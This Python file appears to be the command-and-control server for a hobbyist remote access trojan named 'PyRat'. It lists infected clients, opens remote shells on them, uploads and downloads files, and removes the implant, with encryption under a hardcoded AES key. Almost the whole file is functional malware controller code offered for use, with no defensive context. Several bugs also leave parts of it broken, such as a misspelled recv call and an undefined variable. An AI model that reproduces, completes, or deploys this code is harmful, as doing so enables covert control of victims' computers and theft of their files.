# -*- coding: utf-8 -*-

###Imports###
import socket
import threading
import os

#encryption
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256





#Variables
port = 80                    #Connection Port
key = "0123456789101112"                     #Encryption key (16 characters) use the same on server script
banner = '''
 _______   __      __
|   _   |  \ \    / /
|  |_|  |   \ \  / / 
|   ____|    \ \/ /  
|  |          \  /   
|  |           ||    
|__|           ||    
'''
commands = '''
Available commands:
help                                    - Show this help
clients                                 - List connected clients
client <id>                             - Connect to a client
terminal                                - Open a terminal to execute commands
download <Path_file> <Path_to_past>     - Download a file from client
upload <Path_file> <Path_to_past>       - Upload a file to client
(don't forget .extension in path)
remove                                  - Remove the RAT from client

quit                                    - Close server

USE DOUBLE SPACE
'''



###Class###
class Server(threading.Thread):
    client_count = 1     #set a counter
    clients = {}            #Create an empty dictionary
    
    def __init__(self, port):
        threading.Thread.__init__(self)
        self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #parameters | really required?
        self.soc.bind(("", port))
        self.soc.listen(5)
        
    def run(self):
        #print("Server is listening")
        self.soc.listen(5)
        while True:
            clientsocket, address = self.soc.accept()           #obtain infos from client: ip, os
            #print("conection accepted")
            client_id = self.client_count
            client_os = decrypt(key, clientsocket.recv(4096))
            client = Client(clientsocket, address, client_id, client_os)
            self.clients[client_id] = client
            self.client_count += 1
            
    def print_clients_list(self):
        list = []
        i = 1
        while i < self.client_count:
            clientUsed = self.clients[i]
            print("ID: ", clientUsed.id, "|IP: ", clientUsed.address, "|OS: ", clientUsed.os)
            list.append(self.clients[i])
            i += 1
        return list
        
    def select_client(self, client_id):
        try:
            return self.clients[int(client_id)]
        except:
            return None


class Client():
    def __init__(self, connection, address, id, os):
        self.connection = connection
        self.address = address
        self.id = id
        self.os = os
#    def run():
#        #vérification régulière si le client est tjrs connecté
    def execute(self):
        self.connection.send(encrypt(key, "execute"))
        ctn = True
        print("Use 'exit' command to close terminal")
        while ctn:
            cmd = input("... ")
            if cmd == "exit":
                print("Terminal closed")
                self.connection.send(encrypt(key, "exit"))
                ctn = False
                break
            self.connection.send(encrypt(key, cmd))
            out = decrypt(key, self.connection.recv(4096))
            out = out.decode("utf-8", "ignore")
            print(out)
            
    def uninstall(self):
        self.connection.send(encrypt(key, "uninstall"))
        
    def download(self, path_file, name_file):
        #send to the client the file path which will be download
        pathToDownload = "upload " + str(path_file)
        self.connection.send(encrypt(key, "upload"))
        data_bytes = []
        ctn = True
        i = 1
        received = ""
        received = self.connection.recv(4096)
        #received = decrypt(key, received)
        #name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
        size = received[1]
        while ctn:
            received = self.connection.recb(4096)
            i += 1
            if received == b"Upload finished":
                i = 0
                while i < len(data_bytes):
                    if i == 0:
                        file = open(name_file, "wb")
                        file.write(data_bytes[i])
                        file.close()
                    else:
                        file = open(name_file, "ab")
                        file.write(data_bytes[i])
                        file.close()
                    i += 1
                    if i == len(data_bytes):
                        ctn = False
            else:
                data_bytes.append(received)
            if not received:
                ctn = False
        
    def upload(self, path_file, path_to_past):
        #test if the file exist
        True
        try:
            file = open(path_file, "rb")
            file.close
        except:
            print("File does not exist!")
            do = False
        if do:
            self.connection.send(encrypt(key, "download"))
            octets = os.path.getsize(path_file) / 1024
            info = (path_to_past, octets)
            self.connection.send(encrypt(key, info))
            num = 0
            octets = octets * 1024
            file = open(path_file, "rb") #open file in read only and binary mod
            if octets > 1024:
                if (octets / 1024) != 0:
                    octets = round(octets / 1024 + 1)
                else:
                    octets = octets / 1024
                for i in range(octets):
                    file.seek(num, 0)
                    donnees = file.read(1024)
                    self.connection.send(encrypt(key, donnees))
                    num += 1024
            else:
                donnees = file.read()
                self.connection.send(donnees)
            file.close
            self.connection.send(encrypt(key, "Upload finished"))

        
        


###Functions###
#encryption see https://github.com/vesche/basicRAT/blob/master/core/crypto.py
def encrypt(key, plaintext):
    #prepare text to encryption (a 16 characters long string is required)
    plaintext = plaintext + "\0" * (AES.block_size - len(plaintext) % AES.block_size)
	
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

def decrypt(key, ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")
    
    
    
    
    
###Program###
def main():
    #start server
    server = Server(port)
    server.daemon = True
    server.start()
    
    print("Welcome to PyRat")
    print(commands)
    while True:
        cmd = input(">>>")
        cmd = cmd.split("  ")
        print("Command: ", cmd)
        if cmd[0] == "help":
            print(commands)
        elif cmd[0] == "clients":
            list = server.print_clients_list()
            #for i in list:
            #    clientUsed = self.clients[i]
            #    print("ID: ", clientUsed.id, "|IP: ", clientUsed.address, "|OS: ", clientUsed.os)
        elif cmd[0] == "client":
            try:
                clientUsed = server.select_client(cmd[1])
                print("Connected to {}".format(clientUsed.address))
            except:
                print("Sorry, this ID does not exist")
        elif cmd[0] == "terminal":
            #try:
            clientUsed.execute()
            #except:
                #print("Terminal does not work")
        elif cmd[0] == "download":
            try:
                clientUsed.download(cmd[1], cmd[2])
            except:
                pass
        elif cmd[0] == "upload":
            try:
                clientUsed.upload(cmd[1], cmd[2])
            except:
                pass
        elif cmd[0] == "remove":
            clientUsed.uninstall()
        elif cmd[0] == "quit":
            break
        else:
            print("Command unknown, use help to obtain command list.")

    #server.join()

if __name__ == "__main__":
    main()
